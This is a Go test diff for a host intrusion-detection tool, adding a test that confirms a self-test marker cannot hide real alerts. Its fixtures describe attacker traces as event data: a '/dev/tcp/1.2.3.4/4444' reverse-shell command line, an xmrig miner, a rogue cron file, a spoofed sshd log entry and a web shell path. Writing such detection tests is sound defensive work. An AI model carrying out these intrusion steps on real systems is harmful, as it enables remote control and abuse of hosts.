@@ -151,6 +151,45 @@ func TestSelfTestEndToEnd(t *testing.T) {
 	}
 }
 
+// The marker is visible to local users while a test runs (ps, /tmp), so it
+// must not let anything but the agent's exact traces through.
+func TestSelfTestMarkerCannotHideRealFindings(t *testing.T) {
+	s, err := New(&Config{DataDir: t.TempDir()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	ta := newTestAgent(t, s)
+	s.mu.Lock()
+	st, _ := s.startSelfTest(ta.a, "admin")
+	s.mu.Unlock()
+	m := "vigil-selftest-" + st.ID
+	ta.send(t,
+		proto.NewEvent("selftest.started", map[string]any{"id": st.ID}),
+		// www-data copies the marker into its own path
+		proto.NewEvent("process.exec", map[string]any{"exe": "/tmp/" + m + "-1/sleep", "uid": 33, "signals": []any{"tmp_exe"}}),
+		// root, right path, but a reverse shell on top
+		proto.NewEvent("process.exec", map[string]any{"exe": "/tmp/" + m + "-2/sleep", "uid": 0, "cmdline": "sleep /dev/tcp/1.2.3.4/4444", "signals": []any{"tmp_exe", "cmd_reverse_shell"}}),
+		// a miner named after the marker
+		proto.NewEvent("process.exec", map[string]any{"exe": "/tmp/" + m + "-3/xmrig", "uid": 0, "signals": []any{"tmp_exe", "cmd_miner"}}),
+		// a cron file next to the real one
+		proto.NewEvent("file.added", map[string]any{"path": "/etc/cron.d/" + m + "-evil", "category": "cron", "hash": "z"}),
+		// a spoofed log line from an ordinary user
+		proto.NewEvent("log.spoofed", map[string]any{"identifier": "sshd", "comm": "logger", "uid": "1000", "message": m + " hi"}),
+		// a web request carrying the marker
+		proto.NewEvent("web.activity", map[string]any{"ip": "203.0.113.9", "log": "/var/log/nginx/access.log", "shells": 1, "samples": []any{"/" + m + "/shell.php"}}),
+	)
+	for _, rule := range []string{"process.tmp_exec", "process.reverse_shell", "process.miner", "file.cron", "log.spoofed", "web.shell_access"} {
+		if len(s.openAlerts(rule)) == 0 {
+			t.Errorf("%s hidden by the marker", rule)
+		}
+	}
+	for _, step := range st.Steps {
+		if step.Status != "waiting" {
+			t.Errorf("step %s counted a foreign trace: %s", step.Step, step.Status)
+		}
+	}
+}
+
 func TestSelfTestMissingStepFails(t *testing.T) {
 	s, err := New(&Config{DataDir: t.TempDir()})
 	if err != nil {
